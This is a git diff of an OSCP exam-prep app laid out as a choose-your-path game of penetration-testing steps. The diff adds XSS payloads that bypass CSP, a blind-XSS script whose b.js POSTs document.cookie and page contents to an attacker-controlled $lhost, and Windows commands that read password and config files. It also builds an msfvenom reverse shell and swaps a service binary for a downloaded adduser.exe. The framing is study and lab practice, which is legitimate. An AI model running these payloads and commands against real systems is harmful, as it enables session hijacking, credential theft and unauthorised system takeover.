+# ══════════════════════════════════════════════════
+# First check what the CSP allows:
+curl -sI http://$ip | grep -i "content-security-policy"
+
+# If CSP allows certain CDNs, look for JSONP endpoints:
+<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1)"></script>
+
+# AngularJS CDN allowed? Template injection:
+<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>
+
+# Base tag injection — redirect all relative URLs:
+<base href="http://$lhost/">
+
+# ══════════════════════════════════════════════════
+# BLIND XSS — for stored XSS where admin views later
+# ══════════════════════════════════════════════════
+# Plant this in any input field that admins might see
+# (support tickets, user profiles, product reviews):
+<script src=http://$lhost/b.js></script>
+
+# Self-hosted blind XSS on Kali:
+# b.js:
+fetch('http://$lhost/beacon',{method:'POST',body:JSON.stringify({
+  url:location.href,
+  cookie:document.cookie,
+  dom:document.body.innerHTML,
+  referrer:document.referrer
+})})
+
+# Or use XSSHunter-style service (self-host: xsshunter.trufflesecurity.com)
+
+# ══════════════════════════════════════════════════
+# PROGRESSIVE TESTING WORKFLOW
+# ══════════════════════════════════════════════════
+# 1. Submit canary → find context in source
+# 2. Try Level 1 (can I inject HTML?) → if yes, continue
+# 3. Try Level 2 (raw script tag) → if blocked, try event handlers
+# 4. Identify what's being filtered/encoded (test chars: < > " ' ; \ )
+# 5. Apply bypass technique matching the filter
+# 6. Escalate to cookie theft / admin action`,
+    warn: "Cookies with HttpOnly flag can't be stolen via document.cookie — use XHR to steal session by making authenticated requests instead. Stored XSS > reflected (persists, hits every visitor). On OSCP: XSS is usually a path to admin panel access, not the final goal. Check for CSRF tokens in stolen pages — admin actions often need them. Blind XSS needs patience — admin may not view for minutes or hours. Reference: https://xssnow.in (900+ payloads by context, WAF bypass database).",
     choices: [
-      { label: "Stole admin cookie — hijacked session", next: "file_upload" },
-      { label: "No interesting cookies — pivot to other vectors", next: "web_fuzz_deep" },
+      { label: "Stole admin cookie — access admin panel", next: "login_page" },
+      { label: "Admin panel has upload — webshell time", next: "file_upload" },
+      { label: "Planted blind XSS — waiting for hit", next: "web_fuzz_deep" },
+      { label: "Need to hijack full session via XHR", next: "creds_found" },
+      { label: "Nothing fired — try different vector", next: "web_fuzz_deep" },
     ],
   },
 
@@ -7297,9 +7999,9 @@ type C:\\Users\\diana\\Documents\\*.txt
 # App-specific configs — based on what you found in Step 6
 # Pattern: Get-ChildItem -Path C:\\<appdir> -Include *.txt,*.ini,*.conf,*.php,*.config -File -Recurse -ErrorAction SilentlyContinue
 # XAMPP example:
-Get-ChildItem -Path C:\\xampp -Include *.txt,*.ini,*.conf,*.php,*.config -File -Recurse -ErrorAction SilentlyContinue
-type C:\\xampp\\passwords.txt
-type C:\\xampp\\mysql\\bin\\my.ini
+Get-ChildItem -Path C:\\\\xampp -Include *.txt,*.ini,*.conf,*.php,*.config -File -Recurse -ErrorAction SilentlyContinue
+type C:\\\\xampp\\passwords.txt
+type C:\\\\xampp\\mysql\\bin\\my.ini
 # FileZilla example:
 type C:\\Users\\$env:USERNAME\\AppData\\Roaming\\FileZilla\\sitemanager.xml
 # IIS example:
@@ -7769,9 +8471,9 @@ sc start <ServiceName>`,
 Get-ChildItem -Path C:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
 
 # ── XAMPP / WEB SERVER CONFIGS ───────────────────────
-Get-ChildItem -Path C:\\\\xampp -Include *.txt,*.ini,*.conf,*.php,*.config -File -Recurse -ErrorAction SilentlyContinue
-type C:\\\\xampp\\\\passwords.txt
-type C:\\\\xampp\\\\mysql\\\\bin\\\\my.ini
+Get-ChildItem -Path C:\\xampp -Include *.txt,*.ini,*.conf,*.php,*.config -File -Recurse -ErrorAction SilentlyContinue
+type C:\\xampp\\\\passwords.txt
+type C:\\xampp\\\\mysql\\\\bin\\\\my.ini
 # my.ini often has plaintext MySQL password + Windows password comment
 
 # ── USER HOME DIRS ───────────────────────────────────
@@ -8118,7 +8820,7 @@ Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Ob
 
 # ── STEP 2: CHECK BINARY PERMISSIONS ─────────────────
 # F = Full access (can replace), RX = Read+Execute only (cannot replace)
-icacls "C:\\\\xampp\\\\mysql\\\\bin\\\\mysqld.exe"
+icacls "C:\\xampp\\\\mysql\\\\bin\\\\mysqld.exe"
 
 # PowerUp automated check
 . .\\PowerUp.ps1
@@ -8140,11 +8842,11 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f exe -o shell
 
 # ── STEP 4: REPLACE THE BINARY ────────────────────────
 # Backup original first!
-move C:\\\\xampp\\\\mysql\\\\bin\\\\mysqld.exe C:\\\\Users\\\\dave\\\\mysqld.exe.bak
+move C:\\xampp\\\\mysql\\\\bin\\\\mysqld.exe C:\\\\Users\\\\dave\\\\mysqld.exe.bak
 
 # Transfer and place
 iwr http://$lhost/adduser.exe -OutFile adduser.exe
-move .\\adduser.exe C:\\\\xampp\\\\mysql\\\\bin\\\\mysqld.exe
+move .\\adduser.exe C:\\xampp\\\\mysql\\\\bin\\\\mysqld.exe
 
 # ── STEP 5: RESTART SERVICE ───────────────────────────
 # Try manual restart (usually denied)
@@ -8164,7 +8866,7 @@ shutdown /r /t 0
 Get-LocalGroupMember Administrators
 
 # ── STEP 7: RESTORE ───────────────────────────────────
-move C:\\\\Users\\\\dave\\\\mysqld.exe.bak C:\\\\xampp\\\\mysql\\\\bin\\\\mysqld.exe
+move C:\\\\Users\\\\dave\\\\mysqld.exe.bak C:\\xampp\\\\mysql\\\\bin\\\\mysqld.exe
 shutdown /r /t 0`,
     warn: "Always backup the original binary before replacing. Note what you changed for the report and restore it. Rebooting can cause unexpected issues — only do it in lab environments.",
     choices: [
@@ -9602,6 +10304,8 @@ const PHASES = {
   AD:        { color: "#b5179e", icon: "◈" },
   REPORT:    { color: "#a0aec0", icon: "✎" },
   MINDSET:   { color: "#c084fc", icon: "◯" },
+  EXPLOIT:   { color: "#f87171", icon: "⚡" },
+  POST:      { color: "#fb923c", icon: "★" },
 };
 
 // ─────────────────────────────────────────────
@@ -9684,7 +10388,7 @@ export default function OSCPAdventure() {
     lines.push('## Next Move');
     lines.push('');
     node.choices.forEach(c => {
-      lines.push(`- [ ] ${c.label} → \`${c.next}\``);
+      lines.push(`- [ ] ${c.label} → \`${c.next || c.href || "external"}\``);
     });
     lines.push('');
     lines.push('---');
@@ -9702,7 +10406,7 @@ export default function OSCPAdventure() {
       if (e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA") return;
       const num = parseInt(e.key);
       if (!isNaN(num) && num >= 1 && num <= node.choices.length) {
-        go(node.choices[num - 1].next);
+        const choice = node.choices[num - 1]; if (choice.href) window.open(choice.href, "_blank"); else go(choice.next);
       }
       if (e.key === "Backspace" || e.key === "ArrowLeft") back();
       if (e.key === "r" || e.key === "R") reset();
